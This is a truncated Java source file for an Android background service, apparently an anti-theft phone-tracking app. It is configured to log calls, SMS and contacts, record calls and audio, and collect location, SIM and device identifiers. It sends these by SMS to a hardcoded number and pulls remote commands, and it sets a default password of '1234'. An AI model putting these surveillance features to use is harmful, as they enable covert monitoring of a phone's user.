package com.rdt.foundphone.service;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Scanner;

import javax.xml.xpath.XPathException;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.DhcpInfo;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.content.ContentValues;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.MediaStore;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;

import com.rdt.foundphone.R;
import com.rdt.foundphone.db.FileDB;
import com.rdt.foundphone.db.FileIO;
import com.rdt.foundphone.db.Values;
import com.rdt.foundphone.function.GetPictureFace;

public class ServiceBG extends Service implements LocationListener, SensorEventListener{

	SharedPreferences prefs;
	SharedPreferences settings;
	
	public static String admin_password = "1234";
	public static String license_key = "xxxx-xxxx-xxxx-xxxx-xxxx";
	public static final String APP_PREFERENCE_VALUES = "F_PHONE" ;
	
	public static int AUTH = 0 ;
	public static int VERSION_APP = 0;
	public static int UPD_INFO_PHONE = 1 ;
	public static int CHECK_COMPARE_SIM = 0 ;
	public static String ADMIN_PHONE_NUMBER = "89806401500" ;
	
	public static int c_mic_swith = 0 ;

	public static int option_write_voice_call = 1 ;
	public static int option_write_sms_log = 1 ;
	public static int option_write_call_log = 1 ;
	
	public static int option_send_accel_from_sms = 1 ;
	public static int option_send_battery_from_sms = 1 ;
	public static int option_send_light_from_sms = 1 ;
	public static int option_send_temperature_from_sms = 1 ;
	public static int option_send_celllocation_from_sms = 1 ;
	public static int option_send_gps_from_sms = 1 ;
	public static int option_send_param_sms = 0 ;
	
	public static int option_send_accel = 1 ;
	public static int option_send_battery = 1 ;
	public static int option_send_light = 1 ;
	public static int option_send_temperature = 1 ;
	public static int option_send_gps = 1 ;
	public static int option_send_param = 0 ;
	
	public static int time_start_record_audio = 0;
	public static int time_start_play_audio = 0;
	public static String filename_audio_file = "_";
	
	public static int time_vibration = 200 ;
	public static int time_start_vibration = 0 ;

	public static int c_get_list_audio_values = 1 ;
	public static int c_set_new_audio_values = 0 ;
	
	public static int c_get_list_call = 1 ;
	public static int c_get_list_contact = 1 ;
	public static int c_update_list_call = 1 ;
	public static int c_update_list_contact = 1 ;
	public static int c_update_list_sensors = 1 ;

	public static int c_set_wallpaper = 0 ;
	public static int c_create_photo_call_end = 0 ;
	
	public static int STREAM_MUSIC_NEW  = 0 ;
	public static int STREAM_SYSTEM_NEW  = 0 ;
	public static int STREAM_ALARM_NEW  = 0 ;
	public static int STREAM_DTMF_NEW  = 0 ;
	public static int STREAM_NOTIFICATION_NEW  = 0 ;
	public static int STREAM_VOICE_CALL_NEW  = 0 ;
	public static int STREAM_RING_NEW  = 0 ;
	
	public static int period_send_sms = 120 ;
	public static int period_wait_internet = 120 ;
	public static int old_check_internet = 0 ;
	public static int old_check_success_internet = 0 ;
	public static int period_record_audio = 60 ;
	public static int period_record_video = 60 ;
	public static int period_record_screenshot = 240 ;

	public static int period_get_values_phone = 120 ;
	public static int period_get_command = 60 ;
	public static int period_save_log = 60 ;
	public static int period_upload_files = 60 ;
	public static int period_download_files = 60 ;
	
	public static int period_check_gps = 60 ;
	public static int period_old_check_gps = 0 ;
	public static int period_check_battery = 30 ;
	public static int period_check_temperature = 30 ;
	public static int period_check_light = 30 ;
	public static int period_check_accel = 30 ;// NEW
	
	public static int period_wait_gps = 30 ;
	public static int period_turn_on_gps = 30 ;
	public static int period_turn_off_gps = 30 ;
	
	public static int period_wait_sensors = 30 ;
	public static int period_turn_on_sensors = 30 ;
	public static int period_turn_off_sensors = 30 ;
	
	public static int create_photo_if_exist_face = 0 ;
	
	public static int alert_max_move_location = 0 ;
	public static int alert_max_speed_location = 0 ;
	public static int alert_max_level_mic = 0 ;
	
	public static int alert_incoming_call = 0 ;
	
	public static String alert_incoming_call_number_1 = "_" ;
	public static String alert_incoming_call_number_2 = "_" ;
	public static String alert_incoming_call_number_3 = "_" ;
	public static String alert_incoming_call_number_4 = "_" ;
	public static String alert_incoming_call_number_5 = "_" ;
	
	public static int alert_incoming_sms = 0 ;
	
	public static String alert_incoming_sms_number_1 = "_" ;
	public static String alert_incoming_sms_number_2 = "_" ;
	public static String alert_incoming_sms_number_3 = "_" ;
	public static String alert_incoming_sms_number_4 = "_" ;
	public static String alert_incoming_sms_number_5 = "_" ;
	
	public static String alert_incoming_sms_text_1 = "_" ;
	public static String alert_incoming_sms_text_2 = "_" ;
	public static String alert_incoming_sms_text_3 = "_" ;
	public static String alert_incoming_sms_text_4 = "_" ;
	public static String alert_incoming_sms_text_5 = "_" ;
	public static String alert_incoming_sms_text_6 = "_" ;
	public static String alert_incoming_sms_text_7 = "_" ;
	public static String alert_incoming_sms_text_8 = "_" ;
	public static String alert_incoming_sms_text_9 = "_" ;
	public static String alert_incoming_sms_text_10 = "_" ;
	
	public static int alert_outgoing_call = 0 ;
	
	public static String alert_outgoing_call_number_1 = "_" ;
	public static String alert_outgoing_call_number_2 = "_" ;
	public static String alert_outgoing_call_number_3 = "_" ;
	public static String alert_outgoing_call_number_4 = "_" ;
	public static String alert_outgoing_call_number_5 = "_" ;
	
	public static String getDeviceId = "0" ;
	public static String getDeviceSoftwareVersion = "0" ;
	public static int getCallState = 0 ;
	public static String getCellLocation = "0" ;
	public static String getLine1Number = "0" ;
	public static String getNetworkCountryIso = "0" ;
	public static String getNetworkOperator = "0" ;
	public static String getNetworkOperatorName = "0" ;
	public static String getSimCountryIso = "0" ;
	public static String getSimOperator = "0" ;
	public static String getSimOperatorName = "0" ;
	public static String getSimSerialNumber = "0" ;
	public static String getSubscriberId = "0" ;
	public static int getDataState = 0 ;
	public static int getPhoneType = 0 ;
	public static int getSimState = 0 ;
	//NETWORK
	public static String getDetailedState_name = "0" ;
	public static int getDetailedState_ordinal = 0 ;
	public static String getDetailedState_getExtraInfo = "0" ;
	public static String getDetailedState_getReason = "0" ;
	public static int getDetailedState_getSubtype = 0 ;
	public static String getDetailedState_getSubtypeName = "0" ;
	public static int getDetailedState_getType = 0 ;
	public static String getDetailedState_getTypeName = "0" ;
	//NETWORK NetworkInfo
	public static String getDetailedState_connectivityManager_getDetailedState = "0" ;
	public static String getDetailedState_connectivityManager_getExtraInfo = "0" ;
	public static String getDetailedState_connectivityManager_getReason = "0" ;
	public static int getDetailedState_connectivityManager_getSubtype = 0 ;
	public static String getDetailedState_connectivityManager_getSubtypeName = "0" ;
	public static int getDetailedState_connectivityManager_getType = 0 ;
	public static String getDetailedState_connectivityManager_getTypeName = "0" ;
	public static String getDetailedState_connectivityManager_isAvailable = "0" ;
	public static String getDetailedState_connectivityManager_isConnected = "0" ;
	public static String getDetailedState_connectivityManager_isConnectedOrConnecting = "0" ;
	public static String getDetailedState_connectivityManager_isFailover = "0" ;
	public static String getDetailedState_connectivityManager_isRoaming = "0" ;
	public static int ActiveNetworkInfo_getNetworkPreference = 0 ;
	//AUDIO
	public static int STREAM_MUSIC = 0 ;
	public static int STREAM_SYSTEM = 0 ;
	public static int STREAM_ALARM = 0 ;
	public static int STREAM_DTMF = 0 ;
	public static int STREAM_NOTIFICATION = 0 ;
	public static int STREAM_VOICE_CALL = 0 ;
	public static int STREAM_RING = 0 ;
	public static int STREAM_MUSIC_MAX = 0 ;
	public static int STREAM_SYSTEM_MAX = 0 ;
	public static int STREAM_ALARM_MAX = 0 ;
	public static int STREAM_DTMF_MAX = 0 ;
	public static int STREAM_NOTIFICATION_MAX = 0 ;
	public static int STREAM_VOICE_CALL_MAX = 0 ;
	public static int STREAM_RING_MAX = 0 ;
	public static String MIC_STATUS = "0" ;
	//CAMERA
	public static int getMaxNumDetectedFaces = 0 ;
	public static int getMaxNumMeteringAreas = 0 ;
	public static int getMaxZoom = 0 ;
	public static int getPictureFormat = 0 ;
	//DISPLAY
	public static String xdpi = "0" ;
	public static String ydpi = "0" ;
	public static String densityDpi = "0" ;
	public static String heightPixels = "0" ;
	public static String widthPixels = "0" ;
	//GPS
	public static int getStatusGPS = 0;
	public static String getLatitude = "0" ;
	public static String getLongitude = "0" ;
	//WIFI DhcpInfo
	public static int getWifi_getIpAddress = 0 ;
	public static int getWifi_getLinkSpeed = 0 ;
	public static int getWifi_getNetworkId = 0 ;
	public static int getWifi_getRssi = 0 ;
	public static String getWifi_getBSSID = "0" ;
	public static String getWifi_getMacAddress = "0" ;
	public static String getWifi_getSSID = "0" ;
	//WIFI DhcpInfo
	public static int getWifi_dns1 = 0 ;
	public static int getWifi_dns2 = 0 ;
	public static int getWifi_gateway = 0 ;
	public static int getWifi_ipAddress = 0 ;
	public static int getWifi_leaseDuration = 0 ;
	public static int getWifi_netmask = 0 ;
	public static int getWifi_serverAddress = 0 ;
	public static int getWifiState = 0 ;
	//SENSORS
	public static String SENSOR_LIGHTLEVEL = "0" ;
	public static String SENSOR_TEMPERATURE = "0" ;
	public static String SENSOR_ACCELEROMETER_X = "0" ;
	public static String SENSOR_ACCELEROMETER_Y = "0" ;
	public static String SENSOR_ACCELEROMETER_Z = "0" ;
	//MEMORY
	public static int getMemoryStatus = 0 ;
	public static int getMemory1Full = 0 ;
	public static int getMemory1Free = 0 ;
	public static int getMemory1Used = 0 ;
	public static int getMemory2Full = 0 ;
	public static int getMemory2Free = 0 ;
	public static int getMemory2Used = 0 ;
	public static int getNumProcessor = 0 ;
	//API Android
	public static int getAPIlevel= 0 ;
	public static String getRELEASE = "";
	public static String getBRAND = "";
	public static String getMODEL = "";
	//OLD ADD TO LOG SENSORS
	public static int oldAddToLOGsensorTemp = 0 ;
	public static int oldAddToLOGsensorLight = 0 ;
	public static int oldAddToLOGsensorAccel = 0 ;
	public static int oldAddToLOGsensorGPS = 0 ;
	//УВЕДОМЛЕНИЕ ПО СМС О МИНИМАЛЬНОМ УРОВНЕ ЗАРЯДА БАТАРЕИ
	public static int sendSMSminimumBatteryLevel = 0 ;
	public static int minimumBatteryLevel = 15 ;
	//УСТАНОВКА ФОНОВОГО РИСУНКА ЕСЛИ НОВАЯ СИМ
	public static int setWallpaperNewSim = 0 ;
	//СОЗДАНИЕ ФОТО ЕСЛИ НОВАЯ СИМ
	public static int createPhotoNewSim = 0 ;

	static HttpURLConnection conn;
	//РАБОТА С КАМЕРОЙ
	public Camera camera;
	public SurfaceView surfaceView;
	public SurfaceHolder surfaceHolder;
	final int RESULT_SAVEIMAGE = 0;
	boolean previewing = false;
	//создание скриншота
	public String fileName;
	//создание фото и видео
	public File photoFile;
	public File videoFile;
	//запись и воспроизведение звуков
	public MediaRecorder mediaRecorder;
	public MediaPlayer mediaPlayer;	
	//SENSORS
	public SensorManager mSensorManager;
	public Sensor sensorTemp;
	public Sensor sensorLight;
	public Sensor sensorAccelerometer;
	public Sensor sensorLinearAccel;
	public Sensor sensorGeomagnetic;
	public Sensor sensorGravity;
	public Sensor sensorGyroscope;
	public Sensor sensorMagnetic;
	public Sensor sensorPressure;
	public Sensor sensorProximity;
	public Sensor sensorRotation;
	public Sensor sensorSignificant;
	public Sensor sensorStepcounter;
	
	public static int option_send_linearAccel = 0 ;
	public static int option_send_geomagnetic = 0 ;
	public static int option_send_gravity = 0 ;
	public static int option_send_gyroscope = 0 ;
	public static int option_send_magnetic = 0 ;
	public static int option_send_pressure = 0 ;
	public static int option_send_proximity = 0 ;
	public static int option_send_rotation = 0 ;
	public static int option_send_significant = 0 ;
	public static int option_send_stepcounter = 0 ;
	
	List<Sensor> sensors;
	public Parameters parameters;
	//GPS
	private LocationManager locationManager;
	public String lon = "";
	public String lat = "";
	//ХРАНЕНИЕ ДАННЫХ
	public static FileIO fileIO;
	//ПРОВЕРКА НА СМЕНУ СИМ
	public static String StrNewSimSerialNumber;
	public static String StrOldSimSerialNumber;
	public static String StrNewSimOperatorName;
	//ЕСЛИ ЕСТЬ НОВЫЙ АЛЕРТ
	public static int AlertOutCall;
	public static String AlertOutCallTEXT;
	public static int AlertIncCall;
	public static String AlertIncCallTEXT;
	public static int AlertIncSMS;
	public static String AlertIncSMS_TEXT;
	public static int AlertIncSMSText;
	
	public static int oldTimeSendFiles = 0; //NEW
	
	public AudioManager am;
	
	public static int timeThis = 0;
	
	/*************************************************************************************************/

    public void onCreate() {
    	super.onCreate();
	System.out.println("ServiceBG run onCreate");
	
	am = (AudioManager)this.getSystemService(Context.AUDIO_SERVICE);
    	
	locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
    	
	this.prefs = PreferenceManager.getDefaultSharedPreferences(this);
	settings = getSharedPreferences(APP_PREFERENCE_VALUES , Context.MODE_PRIVATE);
        
	int tmpAUTH = settings.getInt("AUTH", 0);
	if(tmpAUTH == 0 || (tmpAUTH != 0 && tmpAUTH != 1)){
	AUTH = 1; tmpAUTH = 1;
	saveSetting();
	}else{ loadSetting(); }
	timeThis = getDataCalender();
	 checkFolder();
	try {
		Sensors();
	} catch (IOException e1) {
		e1.printStackTrace();
	}
 /*************************************************************************************************/ 
	 try{
	 getSIM();//+ПОЛУЧЕНИЕ ДАННЫХ СИМ
	 }catch (Exception e) {
	 	System.out.println("ERROR getSIM: "+ e.getMessage());
	 }
    
	 if(getSimSerialNumber != null){
	 StrOldSimSerialNumber = getSimSerialNumber;
		 if(StrNewSimSerialNumber.equals(StrOldSimSerialNumber)){
		 	System.out.println("getSIM SimSerialNumber-> SUCCESS");
		 }else{
		 	System.out.println("getSIM SimSerialNumber-> NOT VALID");
		 if(CHECK_COMPARE_SIM == 1){
		 	System.out.println("getSIM SimSerialNumber-> NOT VALID -> SEND SMS");	
		 	sendSMS(ADMIN_PHONE_NUMBER, "F_PHONE: EXIST NEW SIM, SimSerialNumber["+StrNewSimSerialNumber+"] SimOperatorName["+StrNewSimOperatorName+"]");
		 } }
	 }
	 
		getCameraParameters();
		getDisplayParameters();
		getInternet();
		getWifi();
		getAudio();
		getMIC();
		getMemory();
		getAPIlevel();
		saveSetting();
		getListSensors();
	 	getListCall(getBaseContext());
	 	getContact();
	    saveSetting();
	    if((timeThis - oldTimeSendFiles) > period_upload_files){ autoSendFiles(); oldTimeSendFiles = timeThis;}

		try {
			System.out.println("CommandUPD -> START" );
			CommandUPD();
		} catch (IOException | JSONException e) {
			System.out.println("CommandUPD ->  ERROR");
			e.printStackTrace();
		}
		
    	//switchLight();//УПРАВЛЕНИЕ ФОНАРИКОМ
    	//setFlashLigthOn();
    	//setFlashLightOff();
 /***************** TESTED WORK *****************/
 	if(option_send_battery == 1){ getBatteryInfo(); }
    if((timeThis - time_start_vibration) < 0){ time_start_vibration = 0; runVibration(); }
    if(c_set_wallpaper == 1){ setWallpaper(); c_set_wallpaper = 0; }
    if(c_set_new_audio_values == 1){ swithAudio(); c_set_new_audio_values = 0; }
    if(c_get_list_audio_values == 1){ getAudio(); c_get_list_audio_values = 0; }
 	if(c_mic_swith == 1){ swithMIC(); c_mic_swith = 0; }
  //  	getAuth();//АУТЕНТИФИКАЦИЯ
 	if((timeThis - time_start_record_audio) < 0){ createAudioRec(); time_start_record_audio = 0;}
    if((timeThis - time_start_play_audio) < 0){ playAudioRec(); time_start_play_audio = 0;}
/*************************************************************************************************/	
	}

    public void onStart(Intent intent, int startid) {
		this.prefs = PreferenceManager.getDefaultSharedPreferences(this);
		settings = getSharedPreferences(APP_PREFERENCE_VALUES , Context.MODE_PRIVATE);
    	System.out.println("ServiceBG run onStart");
    	
    	checkFolder();
    	
    	locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
		int time = getDataCalender();
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000 * 60, 10, this);
		locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000 * 60, 10, this);
		Location location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
		//Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (locationManager != null){
        	System.out.println("isGPSEnabled -> GPS_PROVIDER ["+location.getLatitude()+"]["+location.getLongitude()+"]");
        	String lat = Double.toString(location.getLatitude());
    		String lon = Double.toString(location.getLongitude());
    		getLatitude = lat; getLongitude = lon;
        	period_old_check_gps = time;
            locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        }
        else{
        	System.out.println("isGPSEnabled -> NETWORK_PROVIDER ["+location.getLatitude()+"]["+location.getLongitude()+"]");
        	String lat = Double.toString(location.getLatitude());
    		String lon = Double.toString(location.getLongitude());
    		getLatitude = lat; getLongitude = lon;
        	period_old_check_gps = time;
        	locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        }
    	
	try {
		Sensors();
	} catch (IOException e) {
		e.printStackTrace();
	}	
	saveSetting();
	        
	/*************************************************************************************************/
	 int tmpAUTH = settings.getInt("AUTH", 0);
	 if(tmpAUTH == 0 || (tmpAUTH != 0 && tmpAUTH != 1)){
	 AUTH = 1;
	 tmpAUTH = 1;
	 saveSetting();
	 }else{ loadSetting(); }
	 timeThis = getDataCalender();
	 saveSetting();
	/*************************************************************************************************/ 
	 try{
		 getSIM();
	 }catch (Exception e) {
	 	System.out.println("ERROR getSIM: "+ e.getMessage());
	 }
	 	StrOldSimSerialNumber = getSimSerialNumber;
	 if(StrNewSimSerialNumber.equals(StrOldSimSerialNumber)){
	 	System.out.println("getSIM SimSerialNumber-> SUCCESS");
	 }else{
	 	System.out.println("getSIM SimSerialNumber -> NOT VALID");
	 if(CHECK_COMPARE_SIM == 1){
	 	System.out.println("getSIM SimSerialNumber -> NOT VALID -> SEND SMS");	
	 	sendSMS(ADMIN_PHONE_NUMBER, "F_PHONE: EXIST NEW SIM, SimSerialNumber["+StrNewSimSerialNumber+"] SimOperatorName["+StrNewSimOperatorName+"]");
	 } }
	 
	getInternet();
	getWifi();
	getAudio();
	getMIC();
	getMemory();
	saveSetting();
	getListSensors();
 	getListCall(getBaseContext());
 	getContact();
    saveSetting();
    if((timeThis - oldTimeSendFiles) > period_upload_files){ autoSendFiles(); oldTimeSendFiles = timeThis;}

		try {
			System.out.println("CommandUPD -> START" );
			CommandUPD();
		} catch (IOException | JSONException e) {
			System.out.println("CommandUPD ->  ERROR");
			e.printStackTrace();
		}
		System.out.println("DEBUG LOG ["+SENSOR_LIGHTLEVEL+"]["+SENSOR_TEMPERATURE+"]["+SENSOR_ACCELEROMETER_X+"/"+SENSOR_ACCELEROMETER_Y+"/"+SENSOR_ACCELEROMETER_Z+"]");	     	
	/************************************************** SEND SMS ***********************************************/
		if((timeThis - old_check_success_internet) > period_wait_internet && option_send_param_sms == 1){
	 		System.out.println("SEND onStart SMS ["+timeThis+"]["+old_check_success_internet+"]["+(timeThis - old_check_success_internet)+"]["+period_wait_internet+"]");
	 		String sms_data = "";
	 		String getDeviceId_m = getDeviceId;
	 		String getCellLocation_m = "CELL_LOC[disable]";
	 		if(option_send_celllocation_from_sms == 1){getCellLocation_m = "CELL_LOC["+getCellLocation+"]";}
	 		String getLatitude_m = "";
	 		String getLongitude_m = "";
	 		if(option_send_gps_from_sms == 1){
	 			getLatitude_m = getLatitude; 
	 			getLongitude_m = getLongitude;}
	 		String SENSOR_LIGHTLEVEL_m = "LIGHT[disable]";
	 		if(option_send_light_from_sms == 1){SENSOR_LIGHTLEVEL_m = "LIGHT["+SENSOR_LIGHTLEVEL+"]";}
	 		String SENSOR_TEMPERATURE_m = "TEMP[disable]";
	 		if(option_send_temperature_from_sms == 1){SENSOR_TEMPERATURE_m = "TEMP["+SENSOR_TEMPERATURE+"]";}
	 		String accelXYZ = "ACCEL_XYZ[disable]";
	 		if(option_send_accel_from_sms == 1){
	 			accelXYZ = "ACCEL_XYZ["+SENSOR_ACCELEROMETER_X+"/"+SENSOR_ACCELEROMETER_Y+"/"+SENSOR_ACCELEROMETER_Z+"]";
	 		}
	 		String moreinfo_m = getCellLocation_m+""+SENSOR_LIGHTLEVEL_m+""+SENSOR_TEMPERATURE_m+""+accelXYZ;
	 		sms_data = "PHONE_S: DEV_ID["+getDeviceId_m+"]GPS LAT["+getLatitude_m+"]LON["+getLongitude_m+"]"+moreinfo_m;
	 		sendSMS(ADMIN_PHONE_NUMBER, sms_data.toString());
	 		System.out.println("SEND SMS "+sms_data);
	 	}
	 	//CHECK NEW ALERT
	 	if(AlertOutCall == 1){
	 		sendSMS(ADMIN_PHONE_NUMBER, AlertOutCallTEXT.toString()); AlertOutCall = 0; AlertOutCallTEXT = "";
	 	}
	 	if(AlertIncCall == 1){
	 		sendSMS(ADMIN_PHONE_NUMBER, AlertIncCallTEXT.toString()); AlertIncCall = 0; AlertIncCallTEXT = "";
	 	}
	 	if(AlertIncSMS == 1){
	 		sendSMS(ADMIN_PHONE_NUMBER, AlertIncSMS_TEXT.toString()); AlertIncSMS = 0; AlertIncSMS_TEXT = "";
	 	}
	 	if(AlertIncSMSText == 1){
	 		sendSMS(ADMIN_PHONE_NUMBER, AlertIncSMS_TEXT.toString()); AlertIncSMSText = 0; AlertIncSMS_TEXT = "";
	 	}
	 /********************************************* SEND SMS ****/
	    	//switchLight();//УПРАВЛЕНИЕ ФОНАРИКОМ
	    	//setFlashLigthOn();
	    	//setFlashLightOff();
	 /***************** TESTED WORK *****************/
	 	if(option_send_battery == 1){ getBatteryInfo(); }
	    if((timeThis - time_start_vibration) < 0){ runVibration(); time_start_vibration = 0;}
	    if(c_set_wallpaper == 1){ setWallpaper(); c_set_wallpaper = 0; }
	    if(c_set_new_audio_values == 1){swithAudio(); c_set_new_audio_values = 0;}
	    if(c_get_list_audio_values == 1){getAudio(); c_get_list_audio_values = 0;}
	 	if(c_mic_swith == 1){ swithMIC(); c_mic_swith = 0; }
	  //  	getAuth();//АУТЕНТИФИКАЦИЯ
	 	if((timeThis - time_start_record_audio) < 0){ createAudioRec(); time_start_record_audio = 0;}
	    if((timeThis - time_start_play_audio) < 0){ playAudioRec(); time_start_play_audio = 0;}
    }
/************************************** FUNCTIONS ******************************/
    @SuppressWarnings("deprecation")
	@SuppressLint("InlinedApi")
	
	/* IF you have get this source - please send message beeline.mts@bk.ru
	
	
	
}